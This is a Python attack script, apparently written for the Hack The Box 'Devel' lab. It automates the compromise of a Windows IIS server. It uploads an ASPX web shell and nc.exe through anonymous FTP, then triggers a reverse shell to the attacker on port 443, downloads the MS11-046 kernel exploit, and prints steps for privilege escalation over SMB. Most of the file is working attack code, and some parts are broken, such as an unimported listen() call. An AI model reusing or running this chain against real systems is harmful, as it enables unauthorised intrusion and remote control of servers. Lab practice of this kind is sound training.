import sys, os, requests, re, subprocess, paramiko,threading
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder
from ftplib import FTP

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Devel
    __________________________________________________________________________\n"""
    print(Fore.LIGHTMAGENTA_EX + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] iis apppool\web","[+] System32", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.5" # change this if change ip on htb.

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit ] > " + Fore.YELLOW + f"http://{target_machine}");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Devel Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

#------------------------------------------------------------------------
malicious_files = ["aspx_cmd.aspx", "nc.exe"]
main_url = f"http://{target_machine}/aspx_cmd.aspx"
lport = 443

def uploadFiles():
    ftp = FTP()
    #ftp.set_debuglevel(2) # verificar si se sube correctamente un archivo.
    ftp.connect("10.10.10.5",21)
    ftp.login('anonymous', '')
    ftp.storbinary('STOR malicious.aspx', open("malicious.aspx", 'rb'))
    for malicious_file in malicious_files:
        ftp.storbinary("STOR %s" % malicious_file, open(malicious_file, "rb"))  # subir archivos de nuestra maquina.

def makeRequest():
    s = requests.Session()
    # print(f"[INFO] Enviando petición a {main_url}...")
    r = s.get(main_url)
    
    if r.status_code != 200:
        print(f"[ERROR] La respuesta no es 200. Código: {r.status_code}")
        return

    viewstate_value = re.findall(r'"__VIEWSTATE" value="(.*?)"', r.text)[0]
    eventvalidation_value = re.findall(r'"__EVENTVALIDATION" value="(.*?)"', r.text)[0]

    post_data = {
        '__VIEWSTATE': f'{viewstate_value}',
        '__EVENTVALIDATION': f'{eventvalidation_value}',
        'txtArg': f'C:\\inetpub\\wwwroot\\nc.exe {machine_ip} 443 -e cmd.exe', 
        'testing': 'excute', 
    }

    # print(f"[INFO] Enviando datos: {post_data}")
    r = s.post(main_url, data=post_data)
    
    if r.status_code == 200:
        print(f"[INFO] Respuesta: {r.text}")
    else:
        print(f"[ERROR] Error al enviar la petición. Código de respuesta: {r.status_code}")

def enter_iis_web():
    uploadFiles()
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        print(str(e))
    
    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()


def system_connect_user():
    commands_send("wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/ms11-046.exe")
    print(tmsg,Fore.RED + f"[Exploit - System32-Windows] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + f"cd C:\Windows\Temp");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - System32-Windows] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + f"mkdir Privesc");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - System32-Windows] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + f"cd Privesc");cm.sleep(.5)

#------------------------------------------------------------------------

def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","iis apppool\web connection"))
                commands_send("cp /usr/share/davtest/backdoors/aspx_cmd.aspx .")
                commands_send("cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .")
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Exploit - iis apppool\web] > " + Fore.YELLOW + f"Listen on port 443");cm.sleep(0.2)
                input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [iis apppool\web] > " + Fore.WHITE + f"Press ENTER to continue...")
                enter_iis_web()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[iis apppool\web] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","System32 user connection"))
                print(tmsg,Fore.RED + f"[Exploit - System32-Linux] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "sudo smbserver.py smbFolder $(pwd)");cm.sleep(.5)
                system_connect_user()
                print(tmsg,Fore.RED + f"[Exploit - System32-Windows] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + f"copy \\{machine_ip}\smbFolder\ms11-046.exe ms11-046.exe");cm.sleep(.5)
                print(tmsg,Fore.RED + f"[Exploit - System32-Windows] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + f".\ms11-046.exe");cm.sleep(.5)
                print(tmsg,Fore.LIGHTBLUE_EX +f"[System32-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
                break
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
